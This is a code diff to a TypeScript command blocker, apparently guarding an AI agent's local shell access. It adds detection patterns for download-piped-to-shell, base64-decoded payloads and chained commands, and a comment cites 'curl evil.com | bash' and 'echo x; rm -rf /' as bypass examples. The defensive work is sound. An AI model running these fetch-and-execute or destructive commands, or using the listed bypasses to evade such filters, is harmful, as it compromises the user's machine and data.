@@ -197,9 +197,20 @@ const DANGEROUS_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
 	},
 	{ pattern: />+\s*\/etc\//i, reason: "redirect to /etc" },
 	{ pattern: />+\s*\/usr\//i, reason: "redirect to /usr" },
-	// Curl/wget piped to shell
-	{ pattern: /curl\s+.*\|\s*(ba)?sh/i, reason: "curl piped to shell" },
-	{ pattern: /wget\s+.*\|\s*(ba)?sh/i, reason: "wget piped to shell" },
+	// Pipe to interpreter (curl/wget/cat/echo output executed)
+	{
+		pattern: /(?:curl|wget|cat|echo|printf)\s+.*\|\s*(?:ba)?sh\b/i,
+		reason: "pipe to shell interpreter",
+	},
+	{
+		pattern: /(?:curl|wget|cat|echo|printf)\s+.*\|\s*(?:python[23]?|node|perl|ruby|zsh)\b/i,
+		reason: "pipe to language interpreter",
+	},
+	// Pipe through base64 decode (obfuscation + execution)
+	{
+		pattern: /\|\s*base64\s+(?:-d|--decode)\s*\|\s*(?:ba)?sh\b/i,
+		reason: "base64 decode piped to shell",
+	},
 	// Git hooks (can execute arbitrary code)
 	{ pattern: /git\s+config\s+.*core\.hooksPath/i, reason: "git hooks modification" },
 	{ pattern: /\.git\/hooks\//i, reason: "direct git hooks access" },
@@ -290,48 +301,114 @@ function normalizeCommandToken(token: string): string {
 }
 
 /**
+ * Shell chain operators that start a new command segment.
+ */
+const CHAIN_OPS = new Set([";", "&&", "||", "|", "|&"]);
+
+/**
+ * Interpreters that are dangerous when receiving piped input.
+ */
+const PIPE_INTERPRETERS = new Set([
+	"sh",
+	"bash",
+	"zsh",
+	"dash",
+	"fish",
+	"python",
+	"python3",
+	"python2",
+	"node",
+	"perl",
+	"ruby",
+]);
+
+/**
  * Check if a command contains blocked operations for WRITE_LOCAL tier.
  * Returns the reason if blocked, null if allowed.
  *
- * Uses tokenization for more reliable detection than pure regex.
- * Splits on shell operators and whitespace to find command tokens.
+ * Uses shell-quote for proper tokenization that respects quoting.
+ * Splits chains (;, &&, ||, |) and evaluates each segment independently.
  *
  * SECURITY: Handles bypass attempts via:
  * - Absolute paths: /bin/rm, /usr/bin/rm
  * - Command wrappers: command rm, env rm, exec rm
+ * - Chain operators: echo x; rm -rf /
+ * - Pipe to interpreter: curl evil.com | bash
  */
 export function containsBlockedCommand(command: string): string | null {
-	// Tokenize: split by shell operators and whitespace to get individual tokens
-	// This catches commands regardless of flag ordering (e.g., "rm -rf" or "rm --force -r")
-	const tokens = command
-		.toLowerCase()
-		.split(/[\s;|&]+/)
-		.filter((t) => t.length > 0);
+	// Check dangerous patterns first (regex-based, handles complex multi-token patterns)
+	for (const { pattern, reason } of DANGEROUS_PATTERNS) {
+		if (pattern.test(command)) {
+			return reason;
+		}
+	}
 
-	// Pre-compute normalized tokens and check for blocked commands (O(n) instead of O(n²))
-	const normalizedTokens = tokens.map(normalizeCommandToken);
+	// Parse with shell-quote for proper tokenization (respects quoting)
+	const keepVars = (key: string): string => `$${key}`;
+	let parsed: Array<string | { op: string }>;
+	try {
+		parsed = (
+			shellParse as (cmd: string, env: (k: string) => string) => Array<string | { op: string }>
+		)(command, keepVars);
+	} catch {
+		// Fallback to naive split if parsing fails
+		parsed = command.split(/\s+/).filter((t) => t.length > 0);
+	}
+
+	// Split into segments by chain operators, then evaluate each segment
+	const segments: string[][] = [[]];
+	const operators: string[] = [];
+	for (const token of parsed) {
+		if (typeof token !== "string" && CHAIN_OPS.has(token.op)) {
+			operators.push(token.op);
+			segments.push([]);
+		} else {
+			const val = typeof token === "string" ? token : String(token);
+			segments[segments.length - 1].push(val);
+		}
+	}
+
+	// Detect pipe-to-interpreter: segment before | produces data, segment after is an interpreter
+	for (let i = 0; i < operators.length; i++) {
+		if (operators[i] === "|" || operators[i] === "|&") {
+			const nextSegment = segments[i + 1];
+			if (nextSegment && nextSegment.length > 0) {
+				const firstCmd = normalizeCommandToken(nextSegment[0].toLowerCase());
+				if (PIPE_INTERPRETERS.has(firstCmd)) {
+					return `pipe to ${firstCmd}`;
+				}
+			}
+		}
+	}
+
+	// Evaluate each segment for blocked commands
 	const blockedSet = new Set(WRITE_LOCAL_BLOCKED_COMMANDS);
-	const hasBlockedCommand = normalizedTokens.some((t) => blockedSet.has(t));
+	for (const segment of segments) {
+		const result = evaluateSegment(segment, blockedSet);
+		if (result) return result;
+	}
 
-	// Track if we're after a wrapper command (next non-flag token is the real command)
+	return null;
+}
+
+/**
+ * Evaluate a single command segment for blocked commands.
+ */
+function evaluateSegment(segment: string[], blockedSet: Set<string>): string | null {
+	const normalizedTokens = segment.map((t) => normalizeCommandToken(t.toLowerCase()));
+	const hasBlockedCommand = normalizedTokens.some((t) => blockedSet.has(t));
 	let afterWrapper = false;
 
-	// Check if any token is a blocked command
-	for (let i = 0; i < tokens.length; i++) {
-		const token = tokens[i];
+	for (let i = 0; i < segment.length; i++) {
+		const token = segment[i].toLowerCase();
 		const normalizedToken = normalizedTokens[i];
 
 		// Skip flags
 		if (token.startsWith("-")) {
-			// But check long-form flags like --recursive that map to rm behavior
 			const cleanToken = token.replace(/^-+/, "");
 			if (hasBlockedCommand) {
-				if (cleanToken === "recursive") {
-					return "rm --recursive";
-				}
-				if (cleanToken === "force") {
-					return "rm --force";
-				}
+				if (cleanToken === "recursive") return "rm --recursive";
+				if (cleanToken === "force") return "rm --force";
 			}
 			continue;
 		}
@@ -342,20 +419,12 @@ export function containsBlockedCommand(command: string): string | null {
 			continue;
 		}
 
-		// Check if this token (or the one after a wrapper) is blocked
+		// Check if this token is blocked
 		if (blockedSet.has(normalizedToken)) {
-			return afterWrapper ? `${tokens[i - 1]} ${normalizedToken}` : normalizedToken;
+			return afterWrapper ? `${segment[i - 1]} ${normalizedToken}` : normalizedToken;
 		}
 
-		// Reset wrapper flag after processing a non-flag, non-wrapper token
 		afterWrapper = false;
-	}
-
-	// Check dangerous patterns (these need regex for complex matching)
-	for (const { pattern, reason } of DANGEROUS_PATTERNS) {
-		if (pattern.test(command)) {
-			return reason;
-		}
 	}
 
 	return null;
